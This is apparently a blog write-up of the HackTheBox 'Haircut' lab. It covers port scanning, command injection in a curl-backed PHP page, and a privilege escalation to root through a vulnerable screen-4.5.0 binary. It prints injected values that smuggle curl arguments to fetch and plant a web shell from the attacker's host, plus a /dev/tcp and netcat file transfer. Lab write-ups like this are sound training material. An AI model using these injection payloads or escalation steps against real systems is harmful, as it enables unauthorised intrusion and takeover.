---
title: 'HTB | Haircut'
published: 2025-07-02
draft: false
description: 'HTB Machine `Haircut` writeup.'
tags: ['HackTheBox', 'linux']
---

# Recon : Phase 1

## `Nmap` Scan / Port Scanning

### `TCP` Deep Scan

```
# Nmap 7.94SVN scan initiated Thu Jun 12 18:14:17 2025 as: nmap -sC -sV -p22,80 -Pn -n -vv -oN nmap/tcp_deep 10.10.10.24
Nmap scan report for 10.10.10.24
Host is up, received user-set (0.073s latency).
Scanned at 2025-06-12 18:14:18 IST for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title:  HTB Hairdresser
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 12 18:14:28 2025 -- 1 IP address (1 host up) scanned in 11.06 seconds
```

- 2 ports are open : 22 (SSH) and 80 (http)
- No `UDP` ports are open

<hr>
## Web App Recon

### Directory Bruteforce

- The site at first-look looked static, rendering `.html` pages.
- Using, `ffuf` with wordlist `directory-list-2.3-small.txt` and extension `.html` , found a couple of more static pages like `hair.html` , `test.html`
- Using the same wordlist with `.php` extension, found an endpoint `exposed.php`.

### `exposed.php`

- The page says :
  `enter a hairdresser location you would like to check. for example: http://localhost/test.html`
- Entering any `url` , the app makes a request with `cURL` and renders it output on the page.
- The given `URL` is being added to the command something like this : `$ curl $URL`

<hr>

# Exploitation

## Command Injection

### Executing a different command

- Trying to break the `cURL` command using `;` and executing a simple `ping` command does not work, as the character `;` is being blocked.
- However, trying a sub-shell trick does work.
  `http://10.10.14.25/$(whoami)`
- Another trick could be **adding a new line** using **`%0a`**
- This gives a large combination of ways we can get a reverse shell.
- I will try the simplest method.

### Reverse Shell

- I use a simple payload to save the output of the request to a writable directory of my user.
- The `pwd` does not allow me to create a file, but the `uploads` folder in the current directory does have write access.
- The payload I used :
  `http://10.10.14.25/shell.php -s -o uploads/shell.php`
- Now, starting a `nc` listener and requesting the `shell.php` page at `uploads/sehll.php`, I receive a web shell as `www-data`.

<hr>

# Recon : Phase 2

## Getting Lay of the Land

- The box has a single user `maria`.
- The system running is `Ubuntu 16.04`.
- There are no special services, other than `mysql` or `cron` jobs running.
- The home directory of `maria` has some files along with `user.txt` as readable.
- A similar file was `/home/maria/.tasks/.task1` , which had credentials for `mysql`
- Logging in as user `root` with the password found to `mysql` , there are no unique tables. Just the default ones that come with `mysql`.

### Finding `SUID` binaries

- A simple search for `SUID` binaries list the following :

```
$ find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/bin/sudo
/usr/bin/mlocate
/usr/bin/pkexec
/usr/bin/chage
/usr/bin/screen.old
/usr/bin/newuidmap
/usr/bin/crontab
/usr/bin/bsd-write
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/wall
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

- Among these, `screen-4.5.0` stands out. I remember reading about a vulnerable version of this binary in the **`Linux Priv. Esc.`** module on **`HTB Academy`**.
- This is the same version, that is indeed vulnerable.

<hr>

# Privilege Escalation

## Mistakes / Bad Practices

### Try 1 :Copy, Paste & Run

- I found an exploit for this vulnerability on **`exploitdb`**, which I just copied and executed.
- Didn't work obviously
- Furthermore, the exploit broke the system, there was no way to `undo` what the exploit did being as `www-data`
- Had to reset the box to try again.

**Note to self** : _Never ever, just copy and paste an exploit and hope it to work_

### Try 2 : Copying each command individually

- This didn't work either.
- There was an error from `gcc` during compilation. It couldn't compile a function used in the programme.
- Ignoring & moving forward again crashed the box, had to reset again.

### Try 3 : Compiling the binary on my system

- I compiled and transfer the two binaries to the box.
- After that, every step in the original script /`poc` worked as expected.
- On the last step, while trying to execute the binary as `root` , I was not able to as the binary was compiled on my system and it required that specific version of the `GLIBC` i.e. `2.23` , my system had `2.34`
- With this, I got stuck again as I had no way to undo all the actions I just did.

<hr>

## Best Approach

- The system was running `Ubuntu 16.04` with the `GLIBC version 2.23`.
- I researched a little and found that the `GLIBC v2.23` comes together with `Ubuntu 16.04`.
- To handle this, I used **Docker**.

### Compiling in Docker / `Ubuntu 16.04`

- I ran the `ubuntu:16.04` image in an interactive shell.

```bash
$ docker run -it ubuntu:16.04 /bin/bash
```

- Next, I installed the tools needed.

```bash
$ apt-get update
$ apt-get install -y build-essential gcc g++ make
```

- Finally, I copied the code and compiled the files as per the original `poc`.
- To transfer these compiled files back to my machine, I used :

```bash
ubuntu$ cat rootshell > /dev/tcp/my_machine_docker_ip/port
```

To catch the file:

```bash
$ nc -q0 -lnp 9001 > rootshell
```

### Shell as `root`

- Finally, I transferred the two files on the box, added `execute` permission to them.
- Ran the remaining commands and got a shell as `root`.
